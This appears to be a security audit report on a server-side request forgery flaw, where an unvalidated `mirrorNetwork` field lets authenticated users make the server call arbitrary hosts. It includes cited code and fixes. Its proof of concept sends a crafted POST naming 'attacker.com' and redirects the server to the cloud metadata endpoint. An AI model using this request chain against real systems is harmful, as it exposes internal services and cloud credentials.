### Title
SSRF via Unvalidated `mirrorNetwork` Field Enabling Server-Side Requests to Attacker-Controlled Hosts

### Summary
Any authenticated user can supply an arbitrary hostname in the `mirrorNetwork` field of `CreateTransactionDto`. The server-side `MirrorNodeREST.fromBaseURL` function has a `default` branch that blindly constructs `https://${mirrorNetwork}` for any unrecognized value, and `MirrorNodeClient` then issues real HTTP GET requests to that URL. This is a direct analog to the reported `/nft-http-proxy` SSRF: user-controlled input flows into a server-side HTTP request with no allowlist enforcement.

### Finding Description

**Step 1 — User-controlled input with no allowlist**

`CreateTransactionDto.mirrorNetwork` is validated only as `@IsNotEmpty()` and `@IsString()`. No format check, no allowlist, no URL validation is applied. [1](#0-0) 

**Step 2 — Default branch constructs arbitrary HTTPS URL**

`MirrorNodeREST.fromBaseURL` maps the four known network names to hardcoded URLs. For every other value it falls through to:

```typescript
default:
  return `https://${mirrorNetwork}`;
``` [2](#0-1) 

**Step 3 — URL is used in a real server-side HTTP request**

`MirrorNodeClient.getMirrorNodeRESTURL` calls `MirrorNodeREST.fromBaseURL(mirrorNetwork)` and appends `/api/v1`: [3](#0-2) 

`getMirrorNodeData` then issues an actual `axios` GET to the constructed URL: [4](#0-3) 

**Step 4 — `mirrorNetwork` is persisted and later consumed by cache services**

The value is stored verbatim in the `Transaction` entity: [5](#0-4) 

The `account-cache.service` and `node-cache.service` (18 `mirrorNetwork` references each) subsequently call `MirrorNodeClient.fetchAccountInfo` / `fetchNodeInfo` with the stored value, triggering the outbound request. [6](#0-5) 

**Step 5 — `MirrorNetworkGRPC` has the same pattern for gRPC connections**

The gRPC default branch appends `:443` to the raw user value and passes it to the Hedera SDK client, creating a second SSRF surface for gRPC/TCP probing: [7](#0-6) 

### Impact Explanation

- **Direct SSRF to any HTTPS endpoint**: The attacker supplies `mirrorNetwork = "attacker.com"` and the server makes `GET https://attacker.com/api/v1/accounts/{accountId}`. The attacker's server receives the request, learns the server's egress IP, and can return crafted data.
- **Redirect-based SSRF to internal HTTP services**: `axios` follows HTTP redirects by default. An attacker-controlled HTTPS server can issue a `302 → http://169.254.169.254/metadata/v1.json` (or any internal HTTP endpoint). The server follows the redirect, reaching the cloud metadata endpoint — identical to the original report's escalation scenario.
- **Internal network probing**: Any internal HTTPS service (Redis admin UI, Kubernetes API, internal dashboards) is reachable by supplying its hostname.
- **gRPC/TCP port probing**: Via `MirrorNetworkGRPC`, the SDK attempts a gRPC connection to `${mirrorNetwork}:443`, enabling TCP-level probing of internal hosts.

Severity: **Medium** (same classification as the original report), escalating to **Critical** if the deployment is on AWS/GCP/Azure where the metadata endpoint yields IAM credentials.

### Likelihood Explanation

- **Precondition**: A valid authenticated account on the back-end — any registered user qualifies.
- **Trigger**: A single `POST /transactions` request with a crafted `mirrorNetwork` value.
- **No special privileges required**: The `createTransaction` endpoint is available to all authenticated users.
- **Automated**: The cache services trigger the outbound request asynchronously after transaction creation, requiring no further attacker interaction.

### Recommendation

1. **Allowlist `mirrorNetwork`**: Reject any value not in `{mainnet, testnet, previewnet, localnode}` at the DTO validation layer using `@IsIn([MAINNET, TESTNET, PREVIEWNET, LOCAL_NODE])`.
2. **Remove the `default` branch** in both `MirrorNodeREST.fromBaseURL` and `MirrorNetworkGRPC.fromBaseURL`, or throw a validation error for unrecognized values.
3. **Disable axios redirect following** for `MirrorNodeClient` requests (`maxRedirects: 0`) to prevent redirect-based SSRF even if a custom network is ever legitimately needed.

### Proof of Concept

```
POST /transactions HTTP/1.1
Host: <backend-api>
Authorization: Bearer <valid-user-jwt>
Content-Type: application/json

{
  "name": "test",
  "description": "ssrf",
  "transactionBytes": "<valid-bytes>",
  "creatorKeyId": 1,
  "signature": "<valid-sig>",
  "mirrorNetwork": "attacker.com"
}
```

After the transaction is created, the cache service calls:

```
GET https://attacker.com/api/v1/accounts/<accountId>
```

The attacker's server at `attacker.com` responds with:

```
HTTP/1.1 302 Found
Location: http://169.254.169.254/metadata/v1.json
```

`axios` follows the redirect. The server fetches the cloud instance metadata endpoint and the response is processed internally. The attacker confirms exploitation by observing the inbound request on their server and, if the metadata response is reflected in an error message or log, by reading the instance metadata.

### Citations

**File:** back-end/apps/api/src/transactions/dto/create-transaction.dto.ts (L26-28)
```typescript
  @IsNotEmpty()
  @IsString()
  mirrorNetwork: string;
```

**File:** back-end/libs/common/src/utils/mirrorNode/index.ts (L14-15)
```typescript
      default:
        return [mirrorNetwork.endsWith(':443') ? mirrorNetwork : `${mirrorNetwork}:443`];
```

**File:** back-end/libs/common/src/utils/mirrorNode/index.ts (L38-39)
```typescript
      default:
        return `https://${mirrorNetwork}`;
```

**File:** back-end/libs/common/src/transaction-signature/mirror-node.client.ts (L46-51)
```typescript
  async fetchAccountInfo(
    accountId: string,
    mirrorNetwork: string,
    etag?: string,
  ): Promise<{ data: AccountInfoParsed | null; etag: string | null }> {
    const url = `${this.getMirrorNodeRESTURL(mirrorNetwork)}/accounts/${accountId}`;
```

**File:** back-end/libs/common/src/transaction-signature/mirror-node.client.ts (L181-183)
```typescript
  private getMirrorNodeRESTURL(mirrorNetwork: string): string {
    return `${MirrorNodeREST.fromBaseURL(mirrorNetwork)}${this.endpointPrefix}`;
  }
```

**File:** back-end/libs/common/src/transaction-signature/mirror-node.client.ts (L194-201)
```typescript
    try {
      const response = await this.httpService.axiosRef.get<T>(url, {
        headers,
        validateStatus: (status) =>
          status === HTTP_STATUS.OK ||
          // only accept NOT_MODIFIED if we actually sent an ETag
          (etag != null && status === HTTP_STATUS.NOT_MODIFIED),
      });
```

**File:** back-end/apps/api/src/transactions/transactions.service.ts (L449-449)
```typescript
            mirrorNetwork: data.mirrorNetwork,
```
